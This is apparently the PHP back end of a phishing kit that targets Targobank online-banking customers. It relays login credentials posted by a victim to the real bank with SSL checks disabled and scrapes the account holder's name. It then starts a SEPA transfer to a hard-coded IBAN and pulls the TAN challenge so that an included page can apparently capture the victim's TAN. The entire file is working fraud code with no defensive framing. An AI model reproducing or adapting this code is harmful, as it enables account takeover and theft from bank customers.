<?php
//error_reporting(E_ERROR | E_PARSE);

include('ua.php');
session_start();
/*
if(!isset($_SESSION["cookiesFile"])){
    $tmpFileName = dirname(__FILE__) . "/cookies/" . md5(uniqid(rand(), true)).".txt" ;
    $fpp = fopen($_SESSION["cookiesFile"], 'w');
    $_SESSION["cookiesFile"] = $tmpFileName;
}else{
   
}*/
$tmpFileName = $_SESSION["cookiesFile"];
$fp = fopen(dirname(__FILE__) . '/errorlog.txt', 'w');
$fp2 = fopen(dirname(__FILE__) . '/errorlog_.txt', 'w');
$ua = random_uagent();


/*
$init_url = "https://www.targobank.de/de/identification/login.cgi";
$ok = doCall($init_url, $tmpFileName, $fp, "", "https://www.targobank.de/de/identification/login.cgi", $ua, null, true);
*/
$post_login_url = "https://www.targobank.de/de/identification/login.cgi";
$post_login_data = "_cm_user=".$_POST["_cm_user"]."&flag=password&_charset_=windows-1252&_cm_pwd=".$_POST["_cm_pwd"]."&submit.x=52&submit.y=19";
$loginChallenge = doCall($post_login_url, $tmpFileName, $fp, "", "https://www.targobank.de/de/identification/login.cgi", $ua,  $post_login_data, true);
$locations = explode("Location:", $loginChallenge);
if(count($locations) > 1){
    $location = explode("\r\n", $locations[1]);
    if(trim($location[0]) == "https://www.targobank.de/de/banque/paci_engine/engine.aspx"){
       include('se.php');
        $result_ = doCall("https://www.targobank.de/de/banque/espace_personnel.aspx", $tmpFileName, $fp2, "", "https://www.targobank.de/de/identification/login.cgi", $ua,  null, false);
        $doc_ = new DOMDocument();
        $doc_->loadHTML($result_);
        $finder = new DomXPath($doc_);
        $nodes = $finder->query("//*[contains(@class, 'ei_tpl_appl_info_presentation_name')]");
        foreach ($nodes as $node) {
            $name = $node->nodeValue;
         }
        $formurlpage = doCall("https://www.targobank.de/de/banque/virements/vplw_tgdeweb.aspx?site=ii&fede=37&caisse=31911&pays=DE&langue=DE&look=CM_2007&subst=0&fid=VNB_DOM&targetret=content", $tmpFileName, $fp2, "", "https://www.targobank.de/de/banque/virements/vplw_tgdeweb.aspx?site=ii&fede=37&caisse=31911&pays=DE&langue=DE&look=CM%5F2007&subst=0&fid=VNB%5FDOM&targetret=content", $ua, null, false);
        
        $doc__ = new DOMDocument();
        $doc__->loadHTML($formurlpage);
        $finder = new DomXPath($doc__);
        $nodes = $finder->query("//form");
        foreach ($nodes as $node) {
            if($node->getAttribute('id') == "P:F"){
                $action =  $node->getAttribute('action');
            }
        }
        
        $result =  doCall("https://www.targobank.de/$action", $tmpFileName, $fp2, "", "https://www.targobank.de/de/banque/virements/vplw_tgdeweb.aspx?site=ii&fede=37&caisse=31911&pays=DE&langue=DE&look=CM%5F2007&subst=0&fid=VNB%5FDOM&targetret=content", $ua,  "data_input_indiceCompteADebiter=0&Bool%3Adata_input_ajoutBeneficiaire=false&%5Bt%3Adbt%253astring%3Bx%2870%29%5Ddata_input_nomBeneficiaire=test&%5Bt%3Adbt%253astring%3Bx%2822%29%5Ddata_input_IBAN=DE56300209000110520479&%5Bt%3Axsd%253astring%3B%5Ddata_input_montantTemp=5&%5Bt%3Adbt%253adate%3B%5Ddata_input_date=26.02.2019&%5Bt%3Adbt%253astring%3Bx%2847%29%5Ddata_input_motifCompteCredite1=help&%5Bt%3Adbt%253astring%3Bx%2847%29%5Ddata_input_motifCompteCredite2=&%5Bt%3Adbt%253astring%3Bx%2846%29%5Ddata_input_motifCompteCredite3=&_FID_DoValidate.x=58&_FID_DoValidate.y=16&data_select_compteDebite_libelle=PLUS-KONTO&data_select_compteDebite_numeroCompte=DE22300209002803731911&data_select_compteDebite_devise=EUR&data_select_compteDebite_estNonDebitable=false&data_select_compteDebite_numero=&data_select_banqueCiti_codeBanqueCiti=&data_select_banqueCiti_libelle=&data_input_indiceCompteADebiter=0&data_input_nomEmetteur=&data_input_indiceListe=&data_input_BIC=&data_input_IBANBBAN=&data_input_montant=EUR&data_input_currencyTemp=EUR&data_input_codeMotif=&data_input_refE2E=&data_input_motifCompteCredite4=&data_input_sepaReference=&data_input_modeRepartitionFrais=S&data_input_codeEconomique=&data_input_formulaireBeneficiaire=&data_input_modePage=NATIONAL&data_input_codeBanqueCiti=", false);
        
        $doc = new DOMDocument();
        $doc->loadHTML($result);
        
        
        $divElementNew = $doc->getElementsByTagname('label'); 
        
        $out = array(); 
        foreach ($divElementNew as $item) 
        { 
            $out[] = $item->nodeValue; 
        }  
        if(count($out) > 0){
            $tanName= $out[0];
        }
        
        include('tan.page.php');
    }else{
        //header("location: index.php?error");
    }
}else{
    //header("location: index.php?error");
}

   


function doCall($url, $cookie_file, $err_file, $origin, $referer, $ua, $post = null, $getHeader, $follow = false){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);

    
    curl_setopt($ch, CURLOPT_HEADER, $getHeader);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, $follow);

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    

    if($post != null){
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        curl_setopt($ch, CURLOPT_POST, 1);
    }
    
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

    curl_setopt($ch, CURLOPT_VERBOSE, 1);
    curl_setopt($ch, CURLOPT_STDERR, $err_file);
    curl_setopt($ch, CURLOPT_COOKIEJAR,  $cookie_file);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file);

    $headers = array();
    $headers[] = 'Connection: keep-alive';
    $headers[] = 'Pragma: no-cache';
    $headers[] = 'Cache-Control: no-cache';
    $headers[] = 'Origin: '.$origin;
    $headers[] = 'Upgrade-Insecure-Requests: 1';
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    $headers[] = 'User-Agent: '.$ua;
    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8';
    $headers[] = 'Referer: '.$referer;
    $headers[] = 'Accept-Encoding: gzip, deflate, br';
    $headers[] = 'Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $body = curl_exec($ch);
    
    if (curl_errno($ch)) {
        return 'Error:' . curl_error($ch);
    }
    
    curl_close ($ch);
    
    
 
    return $body;
}

?>

